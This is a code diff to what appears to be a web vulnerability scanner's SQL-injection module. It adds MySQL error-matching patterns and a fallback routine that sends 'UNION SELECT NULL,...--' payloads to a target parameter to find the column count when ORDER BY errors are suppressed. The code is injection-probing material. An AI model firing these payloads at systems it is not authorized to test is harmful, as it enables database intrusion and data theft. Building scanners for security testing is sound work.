@@ -27,6 +27,9 @@ logger = get_logger("sql_injection")
 
 SQLI_ERROR_PATTERNS = [
     (r"SQL syntax.*MySQL", "MySQL"),
+    (r"you have an error in your sql syntax", "MySQL"),
+    (r"near '.*' at line", "MySQL"),
+    (r"mysql_", "MySQL"),
     (r"Warning.*mysql_.*", "MySQL"),
     (r"MySQLSyntaxErrorException", "MySQL"),
     (r"valid MySQL result", "MySQL"),
@@ -282,6 +285,34 @@ def _count_union_columns(url, param, sess, timeout, post_data, base_data,
     return last_ok
 
 
+def _count_union_columns_null(url, param, sess, timeout, post_data, base_data,
+                                    prefix: str) -> int:
+    """Column count via UNION SELECT NULL,N... : the largest width whose
+    response stays clean. Complement to ORDER BY when errors are suppressed."""
+    baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
+    if baseline is None:
+        return 0
+    last_ok = 0
+    for n in range(1, 13):
+        payload = "%s UNION SELECT %s-- " % (prefix, ",".join(["NULL"] * n))
+        r = _send(url, param, payload, sess, timeout, post_data, base_data)
+        if r is None:
+            continue
+        if _looks_like_error(r) or _looks_like_column_error(r) \
+                or r.status_code != baseline.status_code:
+            break
+        last_ok = n
+    return last_ok
+
+
+def _looks_like_column_error(r) -> bool:
+    if r is None:
+        return False
+    text = (r.text or "").lower()
+    return ("different number of columns" in text or "column count" in text
+            or "unknown column" in text or "doesn't match" in text)
+
+
 def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
                        waf_name=None, context: str = "unknown"):
     """UNION detection with two outcomes:
@@ -307,6 +338,11 @@ def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
     for prefix in prefixes:
         cols = _count_union_columns(url, param, sess, timeout, post_data,
                                     base_data, prefix)
+        if cols >= 12:
+            # ORDER BY never errored (cap hit): some apps/WAFs swallow ORDER BY
+            # errors. Fall back to UNION SELECT NULL,N... boundary probing.
+            cols = _count_union_columns_null(url, param, sess, timeout,
+                                             post_data, base_data, prefix)
         if cols < 1:
             continue
         markers = ["UMK_%d_%d" % (i, hash((prefix, i)) % 1000) for i in range(1, cols + 1)]
